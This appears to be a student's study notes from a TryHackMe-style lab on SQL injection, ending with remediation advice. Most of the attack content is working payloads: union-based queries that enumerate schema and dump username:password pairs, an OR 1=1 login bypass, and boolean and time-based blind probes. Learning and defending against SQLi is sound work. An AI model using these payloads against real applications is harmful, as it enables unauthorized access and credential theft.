
# SQL Injection

## What is SQL Injection?
SQL Injection (SQLi) is a vulnerability that allows an attacker to interfere with the queries an application makes to its database. It can be used to view data that the attacker is not normally able to retrieve.

## Example Scenario
**Original URL:**
`https://website.thm/blog?id=1`

**Original SQL Query:**
```sql
SELECT * from blog where id=1 and private=0 LIMIT 1;
```

**Malicious URL:**
`https://website.thm/blog?id=2;--`

**Injected SQL Query:**
```sql
SELECT * from blog where id=2;-- and private=0 LIMIT 1;
```

## Types of SQL Injection

### 1. In-Band SQL Injection
- **Error-Based**: Exploits database errors to gain information.
- **Union-Based**: Uses the `UNION` operator to extract data.

**Example Payloads:**
```sql
0 UNION SELECT 1,2,3
0 UNION SELECT 1,2,database()
0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
```

### 2. Blind SQL Injection

#### Authentication Bypass:
```sql
' OR 1=1;--
```

#### Boolean-Based:
```sql
admin123' UNION SELECT 1,2,3 where database() like 'sqli_three%';--
```

#### Discovering Table/Column Names:
```sql
admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name='users';--
admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='sqli_three' and TABLE_NAME='users' and COLUMN_NAME like 'a%';
```

### 3. Time-Based SQL Injection

#### Discovering Column Count:
```sql
admin123' UNION SELECT SLEEP(5),2;--
```

#### Character Enumeration:
```sql
referrer=admin123' UNION SELECT SLEEP(5),2 where database() like 'u%';--
```

### 4. Out-of-Band SQL Injection
- Uses two different communication channels (e.g., HTTP/DNS requests).

## Remediation

- **Prepared Statements**: Use parameterized queries.
- **Input Validation**: Allow list or string replacement.
- **Escaping User Input**: Use escaping to treat special characters as literals.

